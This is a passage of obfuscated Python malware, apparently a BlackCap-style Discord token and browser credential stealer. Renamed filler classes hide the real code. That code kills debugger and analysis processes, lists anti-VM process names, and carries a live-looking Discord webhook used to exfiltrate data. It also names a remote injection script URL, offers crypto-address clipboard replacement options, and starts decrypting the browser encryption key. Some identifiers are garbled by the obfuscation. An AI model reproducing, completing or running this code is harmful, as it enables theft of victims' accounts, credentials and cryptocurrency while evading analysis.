class IIlIlIIllIIlIlII:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.llIIlIIlIlIlllIl()
        IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
        IIIIIIIllIllIIII.IlIIllIlllIIIllll()
        IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
        IIIIIIIllIllIIII.IlIlIIIIIlIIIIII()
        IIIIIIIllIllIIII.lIIlIIIlIIIIlIlllllI()
        IIIIIIIllIllIIII.llllllIIIlI()
        IIIIIIIllIllIIII.lIlIIlIll()
        IIIIIIIllIllIIII.lIlIIIIIIII()
        IIIIIIIllIllIIII.IIlIlIll()
        IIIIIIIllIllIIII.lIIllllIIIIII()
        IIIIIIIllIllIIII.IllllllIlI()
        IIIIIIIllIllIIII.lIIIlllllIIIlIIlIIII()
    def llIIlIIlIlIlllIl(IIIIIIIllIllIIII, lIIIlIllIllII, IIIIlIllII, lllIlllllI, lIIIllllllIIIIIlIIll, llllIlIIIlIIllIlIll, llllIllIl):
        return IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
    def IIIIIlllllIlIIIIIIl(IIIIIIIllIllIIII, lIIIlIllI, lIIllIIIllIlIllll, lIlllIlllIIII, IIlllIIIlIllIIlllll, IllIIlIlllIIlIllI, lIIllllIIIIl, llIIlIllIIIlllIIlI):
        return IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
    def IlIIllIlllIIIllll(IIIIIIIllIllIIII, lIIIlIIIllIllII, llIlIlIIIlIIllI):
        return IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
    def IIlllIIIIIllIlIl(IIIIIIIllIllIIII, lIIlIlII, IlIlIIlIIll, IlIlIllllllIlIllII, IIlIIIIl, lIllIlllIIIllIllI):
        return IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
    def IlIlIIIIIlIIIIII(IIIIIIIllIllIIII, llIIIIllIIIllIIllIl, llIllIIl, IlIlIIllIIlIll, IlIlIlIlIIlIIllI):
        return IIIIIIIllIllIIII.lIIIlllllIIIlIIlIIII()
    def lIIlIIIlIIIIlIlllllI(IIIIIIIllIllIIII, IllllllllllllIlIIIl, IIIlIlIlI):
        return IIIIIIIllIllIIII.IllllllIlI()
    def llllllIIIlI(IIIIIIIllIllIIII, IIlllIllIlIIllIlIl, lllIllll, lllllllIlIIllI):
        return IIIIIIIllIllIIII.lIlIIlIll()
    def lIlIIlIll(IIIIIIIllIllIIII, lllIlIIllIl):
        return IIIIIIIllIllIIII.llllllIIIlI()
    def lIlIIIIIIII(IIIIIIIllIllIIII, IlIIIlIllIlllIIlllIl, lIIlllIllIIII, IIlllIllIlI, llllIllI, IlIlIlIlIIlI, IllIIIIIIIIIIllIIl):
        return IIIIIIIllIllIIII.IlIIllIlllIIIllll()
    def IIlIlIll(IIIIIIIllIllIIII, llIlIlIl, llllllIllIIl, IIlIIIll, IIlIlIIlIII):
        return IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
    def lIIllllIIIIII(IIIIIIIllIllIIII, lllIIlIIIlIIIII, lIIIlllIllllllII, IIlIlIlIIlllIIIlIII):
        return IIIIIIIllIllIIII.IIlIlIll()
    def IllllllIlI(IIIIIIIllIllIIII, IIIllIIlI):
        return IIIIIIIllIllIIII.lIlIIIIIIII()
    def lIIIlllllIIIlIIlIIII(IIIIIIIllIllIIII, IIIIIIIIllI):
        return IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
class llIIIIlIIIllIlIlllll:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lllIlIllIIIl()
        IIIIIIIllIllIIII.IIlIlIllIl()
        IIIIIIIllIllIIII.IllllIIlI()
        IIIIIIIllIllIIII.IIlllIlIl()
        IIIIIIIllIllIIII.llIlIIIIIIlllIIII()
        IIIIIIIllIllIIII.llIllIIIllIIl()
        IIIIIIIllIllIIII.lIlIIIIlIIlIIl()
        IIIIIIIllIllIIII.llIlllIllIlIIIlIll()
        IIIIIIIllIllIIII.llllIIIlIIllllII()
    def lllIlIllIIIl(IIIIIIIllIllIIII, IlllIlIlIIIIIl, lllIlllIlIlIIIIlll):
        return IIIIIIIllIllIIII.lIlIIIIlIIlIIl()
    def IIlIlIllIl(IIIIIIIllIllIIII, IlIIIlIlllI, IlIlIIIllIIII, IllIllIIllIIlIlll, lIllllllII, IlIlIIlll):
        return IIIIIIIllIllIIII.llllIIIlIIllllII()
    def IllllIIlI(IIIIIIIllIllIIII, lIlIlllIllIIIlIII, llIIllIlI, IlIllIlIIIIIlll, llIlIlIlllIIllIlIl, IlIIIlIlIllIIlI, IllIIIllIIIlIIIlIl, IIIIlIlIlllIl):
        return IIIIIIIllIllIIII.IIlIlIllIl()
    def IIlllIlIl(IIIIIIIllIllIIII, lIlIIlllIIIIIllIlIll, lIlIIIIll):
        return IIIIIIIllIllIIII.IIlllIlIl()
    def llIlIIIIIIlllIIII(IIIIIIIllIllIIII, lIIIIllIIlllllI, IIllllllIIIlIlI, IIIIllIlIIIIIlI, IlIlIIlllIIllIlIIII, IlllIIllII):
        return IIIIIIIllIllIIII.IIlIlIllIl()
    def llIllIIIllIIl(IIIIIIIllIllIIII, lIllIlIIIIl, IlIIlIIIllIIlII, llllIlllIlll, lIllIIIlllIll, lIllIIlIllIllIlII, IIlIlIIlIIIlIIIlll):
        return IIIIIIIllIllIIII.IIlllIlIl()
    def lIlIIIIlIIlIIl(IIIIIIIllIllIIII, IlllIlIllIIIIlI, lllllIlllIlII, llIllIlllIIlllIl, IlIlIIIIIIIIlllIIlll):
        return IIIIIIIllIllIIII.llIlIIIIIIlllIIII()
    def llIlllIllIlIIIlIll(IIIIIIIllIllIIII, IIIIIllIlllIlI, IIIIllIllllIl, IIIIIlIlII, IlllllIllIl):
        return IIIIIIIllIllIIII.IIlIlIllIl()
    def llllIIIlIIllllII(IIIIIIIllIllIIII, IIlIlIlIIIlllIII, IIIllllIllllII):
        return IIIIIIIllIllIIII.llllIIIlIIllllII()
class IlIIIllIIlllIlIll:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lIIlllIlllllIIl()
        IIIIIIIllIllIIII.IlIlIIIIIIIIlllIIl()
        IIIIIIIllIllIIII.IIIlIlIIlIIlIIllII()
        IIIIIIIllIllIIII.llIIIllll()
        IIIIIIIllIllIIII.IIlllllIllllIIllllI()
        IIIIIIIllIllIIII.llllIIlIlIlIl()
        IIIIIIIllIllIIII.IllIlllIIIlllIl()
    def lIIlllIlllllIIl(IIIIIIIllIllIIII, lllIlIlIIlIIIlIll):
        return IIIIIIIllIllIIII.IlIlIIIIIIIIlllIIl()
    def IlIlIIIIIIIIlllIIl(IIIIIIIllIllIIII, IllIlIIlllIIIlIIl, IlIIlIlIllIllllI, IIIlIlIlIIlIl, IIIllIlIIlIllIlIl, llIIIIlIIIIlll, IIIIlIIllIIlI, lIIlIIIIllIllIIlIllI):
        return IIIIIIIllIllIIII.IllIlllIIIlllIl()
    def IIIlIlIIlIIlIIllII(IIIIIIIllIllIIII, lIlIIIIIIIllIlII, lIlIIllIlllIIIIlIIl):
        return IIIIIIIllIllIIII.IlIlIIIIIIIIlllIIl()
    def llIIIllll(IIIIIIIllIllIIII, IIIlIIlIIllIIl, lllIIlllIIllII):
        return IIIIIIIllIllIIII.lIIlllIlllllIIl()
    def IIlllllIllllIIllllI(IIIIIIIllIllIIII, lIlllllIllIIll, lIlIlIlIllI):
        return IIIIIIIllIllIIII.llllIIlIlIlIl()
    def llllIIlIlIlIl(IIIIIIIllIllIIII, IIlIIIllIIl, lllIIlIIlI):
        return IIIIIIIllIllIIII.llllIIlIlIlIl()
    def IllIlllIIIlllIl(IIIIIIIllIllIIII, IlIIIIIIlllIIllll, llIIIlIlIIllIIlIlll, lIIIllIlllllIlIlIIl, IIlIlIIIIlIllI, IIIllIIIlIIlIl, lIlIlllllIIIlIIlII, IIllIIIllllIlI):
        return IIIIIIIllIllIIII.llIIIllll()
class llIllIIlIIlIllIIII:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lIlIlIllIlIIlllIlI()
        IIIIIIIllIllIIII.IIllIlIlllIIlIIlIll()
        IIIIIIIllIllIIII.lIllIIIlIlIllIIIIIlI()
        IIIIIIIllIllIIII.lIIllIlllllI()
        IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
        IIIIIIIllIllIIII.llllIlIlIlIlllIIIllI()
        IIIIIIIllIllIIII.IlIllIIIlII()
        IIIIIIIllIllIIII.lIIlllIlllllIl()
        IIIIIIIllIllIIII.llIIlIIlI()
        IIIIIIIllIllIIII.IlIIlIlIIIIlIlIIll()
        IIIIIIIllIllIIII.lIlIllllIIl()
        IIIIIIIllIllIIII.llllIIlIllIl()
        IIIIIIIllIllIIII.lllIlIIlIIIlI()
        IIIIIIIllIllIIII.IIlIIlII()
    def lIlIlIllIlIIlllIlI(IIIIIIIllIllIIII, IlIllIIIlll, lllIllIll, IIlllIIlllllIIlIll):
        return IIIIIIIllIllIIII.lIlIllllIIl()
    def IIllIlIlllIIlIIlIll(IIIIIIIllIllIIII, llIlIIllllIIll, lllllIll, IlIlIIlIlI):
        return IIIIIIIllIllIIII.llllIIlIllIl()
    def lIllIIIlIlIllIIIIIlI(IIIIIIIllIllIIII, lIIIlllIlIlII, lIlIIlllIlllI, llIlIlIIIIIlllllllIl, lIlIIIIIIIIllIIlllI):
        return IIIIIIIllIllIIII.IlIllIIIlII()
    def lIIllIlllllI(IIIIIIIllIllIIII, IIIIllII, IllIllllIIlIlIIlllII, IlllIlIIIIIlllllIl):
        return IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
    def IlIIlIIlIlllIllllIll(IIIIIIIllIllIIII, llIlIlIlllllIIll, lllIIIIIIlIlII, lIIIllIllllIllIlIl, lIIlIIlIIl, IIIllIIllIlIIII, lIIIIIIlllllIlIlll):
        return IIIIIIIllIllIIII.IlIIlIlIIIIlIlIIll()
    def llllIlIlIlIlllIIIllI(IIIIIIIllIllIIII, IIlllllllIlIIIIllI, llllIlIIlIIlIlIIIIl, llIIIllIllII, IIIIIlIlIIIlIlII, lllIllllllII):
        return IIIIIIIllIllIIII.IlIllIIIlII()
    def IlIllIIIlII(IIIIIIIllIllIIII, IlIllIIIl, IIIllIlIllIlI, lIlIIIIlllllIIIII, IIIllllIIIlllIIllIIl, IIlIIllIIIlIl):
        return IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
    def lIIlllIlllllIl(IIIIIIIllIllIIII, IllIIIIII, IIlIlIIIlllIlIIl):
        return IIIIIIIllIllIIII.IIlIIlII()
    def llIIlIIlI(IIIIIIIllIllIIII, IIlIlIIllIIlIllIlI, lIIlIIlIl, llIllIII, llIIIIlIlIlII, llllIlIlIlIII, lIlIIlIlII):
        return IIIIIIIllIllIIII.lIIllIlllllI()
    def IlIIlIlIIIIlIlIIll(IIIIIIIllIllIIII, lllllllIllI, lllIIIIIl, lIIIlIIIllll):
        return IIIIIIIllIllIIII.llllIlIlIlIlllIIIllI()
    def lIlIllllIIl(IIIIIIIllIllIIII, IIIIIllllllIIIlII, IlIIlIIlllllIllI, llllIlIIlIIlIlI):
        return IIIIIIIllIllIIII.IIlIIlII()
    def llllIIlIllIl(IIIIIIIllIllIIII, lllIlllIlIIlllII, IIIIIIIIIlllIllllII, lllllIllIIllIlIl):
        return IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
    def lllIlIIlIIIlI(IIIIIIIllIllIIII, IlIlllll, llIIlIlIllIIII, lIIlllIIlIlIlIll, IIIIIllIIIIIIIIIIII):
        return IIIIIIIllIllIIII.IlIllIIIlII()
    def IIlIIlII(IIIIIIIllIllIIII, IlIIllIlIIIIIIll, IllIllIlIIIIll, llIlIlIlIIl, IIlIlIIllIlIllllIlll, IIllllllI, lIIIlIIlIl):
        return IIIIIIIllIllIIII.IIlIIlII()
class lIIllIllIIl:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.IIIIIllIIIlIIIIllI()
        IIIIIIIllIllIIII.IllllIIlII()
        IIIIIIIllIllIIII.lIIIlIIIll()
        IIIIIIIllIllIIII.IllllIlllIIII()
        IIIIIIIllIllIIII.IIlIllIIIlIlllllll()
        IIIIIIIllIllIIII.llIIIllII()
        IIIIIIIllIllIIII.llIllIllIll()
        IIIIIIIllIllIIII.lIllIIllIl()
        IIIIIIIllIllIIII.llIlllIllIll()
        IIIIIIIllIllIIII.lIIIllII()
        IIIIIIIllIllIIII.lIIIlIll()
    def IIIIIllIIIlIIIIllI(IIIIIIIllIllIIII, llIlIlllIIlIIlIll, IlllIIIlIIllI, lIIlIIllIlIIlIlIIl, lllIlllIllIlIIIlllII, IllllIIIlIIlllIIIIlI):
        return IIIIIIIllIllIIII.lIllIIllIl()
    def IllllIIlII(IIIIIIIllIllIIII, lIlIIIlIllIIl, IllIlIlIll, IlllIIIIllIIlI, IlIlIlIlIIllllIl, IIIlIlllllIlII):
        return IIIIIIIllIllIIII.lIllIIllIl()
    def lIIIlIIIll(IIIIIIIllIllIIII, lIIllIllllIIll, lIllIIlllIIllllIII, IlIIIlIIlII, IlIIIIIIlllIIIlI, lIlIlIIlIllIlllll, lIIIIIlllIIIlIllllI):
        return IIIIIIIllIllIIII.lIIIllII()
    def IllllIlllIIII(IIIIIIIllIllIIII, lIIllIIlllllII, lIIIlIIllIII, llllIlIIlIIlIllIIII, lllIIIIIllIlI, lIlIIllIllllIll, IlIllllllIIIIlIIlIlI, lIIlllllIllI):
        return IIIIIIIllIllIIII.IIIIIllIIIlIIIIllI()
    def IIlIllIIIlIlllllll(IIIIIIIllIllIIII, lIIllIlI, IlIlIIllllII, lllIlIIlllll, llIIlIlII):
        return IIIIIIIllIllIIII.lIIIllII()
    def llIIIllII(IIIIIIIllIllIIII, lllIIlIIlIIllllI, lllIIIlIlllIIIlIlI, llllllIl):
        return IIIIIIIllIllIIII.llIIIllII()
    def llIllIllIll(IIIIIIIllIllIIII, llllIllIIIlIllIIIl, IIIIIIIIll, IllllIIIIIlIllI, lIlIIIIlIllIIlllIII):
        return IIIIIIIllIllIIII.IIlIllIIIlIlllllll()
    def lIllIIllIl(IIIIIIIllIllIIII, IIlIIllllI):
        return IIIIIIIllIllIIII.lIllIIllIl()
    def llIlllIllIll(IIIIIIIllIllIIII, IllIlIIlIl, lIIIIllllll):
        return IIIIIIIllIllIIII.lIIIlIll()
    def lIIIllII(IIIIIIIllIllIIII, IIlIIllI, IllIIIIlIIllII, lIllllIllI, IIIlIllI, IIlIIllIIlIllllIIIl):
        return IIIIIIIllIllIIII.lIllIIllIl()
    def lIIIlIll(IIIIIIIllIllIIII, IlIlllIllIlllI, IIIIlIIlIlIllllllII, lllIIlIlI, lIIlIlIllIIIIII, lIlllIlIlIIllIIIl, IIllIlllIIIIllllIII):
        return IIIIIIIllIllIIII.llIlllIllIll()
import ctypes, sys
if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
    print("Please run this program as administrator.")
    sys.exit(0)
import binascii, threading, IlllIlIIlIIlIlllll
try:
    from psutil import process_iter
except:
    import os
    os.system("pip install psutil")
lIIIlIIIlllIIllIIl = [
    '53757370656e64', '50726f67726573732054656c6572696b20466964646c657220576562204465627567676572', '466964646c6572', '57697265736861726b',
    '64756d70636170', '646e537079', '646e5370792d783836', '6368656174656e67696e652d7838365f3634', '4854545044656275676765725549',
    '50726f636d6f6e', '50726f636d6f6e3634', '50726f636d6f6e363461', '50726f636573734861636b6572',
    '783332646267', '783634646267', '446f744e657444617461436f6c6c6563746f723332',
    '446f744e657444617461436f6c6c6563746f723634', '485454504465627567676572537663', '48545450204465627567676572', '696461', '6964613634', '69646167', '696461673634',
    '69646177', '696461773634', '69646171', '696461713634', '69646175', '696461753634',
    '7363796c6c61', '7363796c6c615f783634', '7363796c6c615f783836', '70726f74656374696f6e5f6964',
    '77696e646267', '7265736861636b6572', '496d706f7274524543', '494d4d554e4954594445425547474552',
    '4d65676144756d706572', '646973617373656d626c79', '4465627567', '5b435055496d6d756e697479',
    '4d65676144756d70657220312e3020627920436f6465437261636b6572202f20536e44', '436861726c6573', '636861726c6573', '4f4c4c59444247', '496d706f72745f7265636f6e7374727563746f72',
    '636f6465637261636b6572', '646534646f74', '696c737079', '67726179776f6c66',
    '73696d706c65617373656d626c796578706c6f726572', '7836346e657464756d706572', '687864',
    '7065746f6f6c73', '73696d706c65617373656d626c79', '68747470616e616c797a6572', '687474706465627567', '70726f636573736861636b6572', '6d656d6f727965646974', '6d656d6f7279',
    '646534646f746d6f64646564', '70726f63657373206861636b6572', '70726f63657373206d6f6e69746f72',
    '717435636f7265', '696461', '696d6d756e697479', '68747470', '74726166666963',
    '77697265736861726b', '666964646c6572', '7061636b6574', '6861636b6572', '6465627567', '646e737079', '646f747065656b', '646f747472616365', '70726f6364756d70', '6d616e61676572',
    '6d656d6f7279', '6e65744c696d6974', '6e65744c696d69746572', '73616e64626f78'
]
lIIIlIIIlllIIllIIl = [binascii.unhexlify(lIIllllllIl.encode()).decode() for lIIllllllIl in lIIIlIIIlllIIllIIl]
def llllIIlIlllIlI():
    while True:
        try:
            for IIIIIllIIlIIll in process_iter():
                for lIIllllllIl in lIIIlIIIlllIIllIIl:
                    if lIIllllllIl.lower() in IIIIIllIIlIIll.IllIlIIlIIllIlIIlIl().lower():
                        IIIIIllIIlIIll.kill()
        except Exception:
            pass
        IlllIlIIlIIlIlllll.sleep(0.5)
threading.Thread(IIllIIlIlllII=llllIIlIlllIlI, daemon=True).start()
class llIlllllIllIllI:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.IIIIlIllIlllIlIlllIl()
        IIIIIIIllIllIIII.lIlIlIIllII()
        IIIIIIIllIllIIII.lllIlIIlllIlIIlIIIIl()
        IIIIIIIllIllIIII.llIlIlII()
        IIIIIIIllIllIIII.llIIIIII()
        IIIIIIIllIllIIII.lIllIlIllIII()
        IIIIIIIllIllIIII.IlllllIIl()
    def IIIIlIllIlllIlIlllIl(IIIIIIIllIllIIII, IIllIIIIIllIllIl, lIIIllIIll, IIIlIIlIIlIIl, lIIIIlIIllII, IlIIlIllIlIllIIlI):
        return IIIIIIIllIllIIII.IIIIlIllIlllIlIlllIl()
    def lIlIlIIllII(IIIIIIIllIllIIII, IIlllllIIlIl, IlIIIIIlllIIlIIlllI, lIIIIlIlIllIl):
        return IIIIIIIllIllIIII.IIIIlIllIlllIlIlllIl()
    def lllIlIIlllIlIIlIIIIl(IIIIIIIllIllIIII, lIIIllIIIIIl, IlIlIIllIlIIIlIIllI, lllIllIIIlllIl, IlIllIlIl, lllIlIlIIIIl, IIlIlIlIIlllIlIl, llIIlIlIIl):
        return IIIIIIIllIllIIII.lllIlIIlllIlIIlIIIIl()
    def llIlIlII(IIIIIIIllIllIIII, llllllIIIIIl, llllIlIllIl, lllIllIIIlllllllIlII, lIIllIIlllIll, llIIllllllIllllllII):
        return IIIIIIIllIllIIII.lllIlIIlllIlIIlIIIIl()
    def llIIIIII(IIIIIIIllIllIIII, IIlIllIIlIIIlIIlIlll, lIIlIlIIIllIII, IIIIllIllIIIllIIIll, IllIlIIlIlIIlllIlI):
        return IIIIIIIllIllIIII.IlllllIIl()
    def lIllIlIllIII(IIIIIIIllIllIIII, IIlIllIIIIl, IlIllIlIIIIl, lIllIIlllIlllllI, lIlllIIlll, IllllllIIIIIlIll, lIlIIlIlIIllIlllIlI, lIIlllIIllIlI):
        return IIIIIIIllIllIIII.llIIIIII()
    def IlllllIIl(IIIIIIIllIllIIII, IlllIIIll, IlIIIIlIllIIllIllIl, IIIlIIII, IlIIIIlllllIIllIl, IllIIllllllllllIll, IIIlIllllIIllllIII):
        return IIIIIIIllIllIIII.llIIIIII()
class llllIIlIlIIlI:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lllllIIllIlI()
        IIIIIIIllIllIIII.lllIIIIllIII()
        IIIIIIIllIllIIII.lllIlllIlI()
        IIIIIIIllIllIIII.IlIIlIlIII()
        IIIIIIIllIllIIII.llIllIIIIIIIIlIl()
        IIIIIIIllIllIIII.IIIIIIIIlll()
        IIIIIIIllIllIIII.IIlIIIIIlII()
        IIIIIIIllIllIIII.lllIlllIllIl()
        IIIIIIIllIllIIII.IIIlllIlIllIlIllIlII()
    def lllllIIllIlI(IIIIIIIllIllIIII, IlIlllIlIIIIIllIlIlI, lIIlIIIIIlIIllIllIIl, lllllllIIllIIlIllI):
        return IIIIIIIllIllIIII.lllIlllIlI()
    def lllIIIIllIII(IIIIIIIllIllIIII, IlIIIIIllIllI, IIlllIlIIIlllIIIllIl, lllllllIIl, lIIIllIlIlll, lllIIlIl, IlIIIIIlIllIlIlII, lllllllIlllIIIl):
        return IIIIIIIllIllIIII.llIllIIIIIIIIlIl()
    def lllIlllIlI(IIIIIIIllIllIIII, IlIlIIllII, lIIlllIlIll, IIlIlIlIll, llIIIlIlIIllllllll):
        return IIIIIIIllIllIIII.lllIIIIllIII()
    def IlIIlIlIII(IIIIIIIllIllIIII, IIIlllIIlIlI, lIIIIIlIIIlI, IlIlllllllIIIIllIl):
        return IIIIIIIllIllIIII.lllllIIllIlI()
    def llIllIIIIIIIIlIl(IIIIIIIllIllIIII, IllIlIlIlIIlIlIIIII, IlIlIIIlllllllIlI, lllIIlIIIIl, lIllIlIlIIIIlll, llIlIIlIIIllIlIIl, IlIlllIlIllII, lIllllIIIIlIl):
        return IIIIIIIllIllIIII.llIllIIIIIIIIlIl()
    def IIIIIIIIlll(IIIIIIIllIllIIII, IIlIllIl):
        return IIIIIIIllIllIIII.lllIIIIllIII()
    def IIlIIIIIlII(IIIIIIIllIllIIII, IIlIllllIlIllIIII, IIlIIlIl, IIIIIIIIlIIlIll, IIlIIlll, lIlIIIIlIlIIllIlll, IlllIllllIll, llIIlIIllIIllllIl):
        return IIIIIIIllIllIIII.lllIlllIllIl()
    def lllIlllIllIl(IIIIIIIllIllIIII, IIIIIlIIlll, lIlllIlllIIIIIlIl, lIIIIIlIIllllI, llIIllllIIlIlllIllll, IIlIlIIlllll):
        return IIIIIIIllIllIIII.lllIIIIllIII()
    def IIIlllIlIllIlIllIlII(IIIIIIIllIllIIII, lIIIllIlIllIIlIIl, IlllIIIllIlI, llIIIlIlllIllIIlll, IlIIIlIIIllllIIlIlII, IIIIllIIl):
        return IIIIIIIllIllIIII.lllllIIllIlI()
class IlIlIIlIIlIllI:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lllIlIIlIlllIIll()
        IIIIIIIllIllIIII.IllIllIIIl()
        IIIIIIIllIllIIII.lIlllIII()
        IIIIIIIllIllIIII.llllllIIIl()
        IIIIIIIllIllIIII.IlIIIlllII()
        IIIIIIIllIllIIII.llIllllIlllIl()
        IIIIIIIllIllIIII.IIllllIIlllIIllIlI()
        IIIIIIIllIllIIII.IIIlIllIlllIl()
        IIIIIIIllIllIIII.lIllllIIllIllllllll()
        IIIIIIIllIllIIII.IlIIllllIIIlIIIllIll()
        IIIIIIIllIllIIII.llIllIll()
        IIIIIIIllIllIIII.lIlIllIIlIIlIIlI()
        IIIIIIIllIllIIII.IIIIIllIIlIlIl()
        IIIIIIIllIllIIII.lIIIIllIIIIIIlI()
    def lllIlIIlIlllIIll(IIIIIIIllIllIIII, IIlllIlIlII):
        return IIIIIIIllIllIIII.lIIIIllIIIIIIlI()
    def IllIllIIIl(IIIIIIIllIllIIII, IIllllIllIIIIIllIl, lllIllllIIIIllIllIll, llIllllllI):
        return IIIIIIIllIllIIII.llIllllIlllIl()
    def lIlllIII(IIIIIIIllIllIIII, IlIllIlIlIIIlIlI):
        return IIIIIIIllIllIIII.llIllllIlllIl()
    def llllllIIIl(IIIIIIIllIllIIII, lllllIIllllIlIlIl, IlIIIlIIllllIIIIllIl, lIIlIIlllllII, IIIllIIllIlIl, IIIllllIIlIlIIlIIIIl, IlIllIIllIII, IlIIlIIl):
        return IIIIIIIllIllIIII.lIlIllIIlIIlIIlI()
    def IlIIIlllII(IIIIIIIllIllIIII, IIIlIIIIIlIlIlIllI, IIIlIlIllIlIIIl, llIIlIllllIlIIlIlII, lIlllllIIllll, IlIIIIlIlII):
        return IIIIIIIllIllIIII.llIllllIlllIl()
    def llIllllIlllIl(IIIIIIIllIllIIII, llllIlIIlI, IIllIIllllIlIIIlIlII):
        return IIIIIIIllIllIIII.IlIIIlllII()
    def IIllllIIlllIIllIlI(IIIIIIIllIllIIII, IIIIlIIIIIIIllIIII, IIlIlllIlIIlllIlI, IlIIlIlll, IIIIIIIIl, IllIlllIIlllIIl, IllIlIlIlI, lIIIllIlIlllIIIIlI):
        return IIIIIIIllIllIIII.lIllllIIllIllllllll()
    def IIIlIllIlllIl(IIIIIIIllIllIIII, lIllIIIllllIIIlIIIII, IIlIIIlIllIl, IIIIIIIlIllIIIllllI, IIIIIllIIllIll):
        return IIIIIIIllIllIIII.lIlIllIIlIIlIIlI()
    def lIllllIIllIllllllll(IIIIIIIllIllIIII, lIIIIIlIIIllllllllII, lIIllllIIlIllllI, lIIIlIIIlIIIIIIIll, llIlllIlIllIIllIIll, llIIlIIIlI, IlIIlIlIlII):
        return IIIIIIIllIllIIII.llllllIIIl()
    def IlIIllllIIIlIIIllIll(IIIIIIIllIllIIII, llIllIIllIIII, lllllIIIlIIIlllIIl, IllIllllIlIIlllllIl):
        return IIIIIIIllIllIIII.IlIIIlllII()
    def llIllIll(IIIIIIIllIllIIII, lllIIllllIII, lIlIlIIIlIlI, IIIlIIlIlIIIIIIIIl, IllIlllIIIIlllIIII, IllIllIllI, llIIlIllllIllI):
        return IIIIIIIllIllIIII.lIllllIIllIllllllll()
    def lIlIllIIlIIlIIlI(IIIIIIIllIllIIII, IIlIlllIIllIIlIIIll, IIIIIIIllllIIIIIIIl):
        return IIIIIIIllIllIIII.lIllllIIllIllllllll()
    def IIIIIllIIlIlIl(IIIIIIIllIllIIII, IlIlIlIlIIII, IIlllllllIlIllll, lIIIllIlIIIllllIll, lIlIIIIl, lllIIllIIlllIlllI, IIlIlIIlIIIllI):
        return IIIIIIIllIllIIII.llIllIll()
    def lIIIIllIIIIIIlI(IIIIIIIllIllIIII, IIllIlIIIIllIllIlI, IllIIIIIlllIlllIIIll, lllIllIlllIlIl, IlIIlIIIllIllIIllII, IIllIllIlllIllIlI, IIIlIlIIl, IIIIIllllII):
        return IIIIIIIllIllIIII.lIIIIllIIIIIIlI()
import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import IlllIlIIlIIlIlllll
import pyperclip
import win32gui
import win32con
import webbrowser
from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import llIIllIlIllIIlIIll
import urllib.request
IllIIlIIIIllIlllIll = os.getenv('LOCALAPPDATA')
IIIllIIllIlllIlllII = os.getenv('APPDATA')
IllIIlIllIllIIII = os.getenv("TEMP")
lIlIlIlIl = [];
IlIIlllIIllIIllI = {
    'yourwebhookurl': "https://discord.com/api/webhooks/1118217510899175564/C5F7XiqilQEMU-fccrqcQoAiqZiyGj4Z8fj_tBSZcupgIovWFuHrKk67woNsOyzsih-d",
    'blackcap_inject_url': "https://raw.githubusercontent.com/toinfinityandbeyonddd/inject/main/index.js",
    'hide': 'yes',
    'ping': 'yes',
    'pingtype': 'everyone',
    'fake_error':'no',
    'startup': 'no',
    'kill_discord_process': False,
    'dbugkiller': False,
    'addresse_crypto_replacer': 'no',
    'addresse_btc': 'none',
    'addresse_eth': 'none',
    'addresse_xchain': 'none',
    'addresse_pchain': 'none',
    'addresse_cchain': 'none',
    'addresse_monero': 'none',
    'addresse_ada': 'none',
    'addresse_dash': 'none',
    'blprggg':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]
}
lIlllIIIlIlllIIIlIIl = os.getlogin()
IIIlIlIllIIIlIIIlII = os.getenv("COMPUTERNAME")
IllIllIIIlll = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
IIlllIIl = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
IIIlIllII = 'https://paste.bingner.com/paste/jkgxr/raw'
IlIIIllIlIIIlIlIIll = requests.get(IIIlIllII) 
IlIllIIIII = IIlllIIlIlIlI"[\w-]{24}\." + IlIIIllIlIIIlIlIIll.text
class lIlIIIllIII(object):
    @staticmethod
    def lIlIIIllIIIIIlII(lIllIIllI: str or os.PathLike):
        if not ntpath.exists(lIllIIllI):
            return None
        with open(lIllIIllI, "r", encoding="utf-8") as lIIIIllIlIIIllIIl:
            IlIlIIlllllIlIlI = lIIIIllIlIIIllIIl.read()
        IllIllIlllIllll = json.loads(IlIlIIlllllIlIlI)
        try:
            lllIIIlIlIlIIllI = b64decode(IllIllIlllIllll["os_crypt"]["encrypted_key"])
            return lIlIIIllIII.llIllIIlIIIlIllIlll(lllIIIlIlIlIIllI[5:])
        except KeyError:
            return None
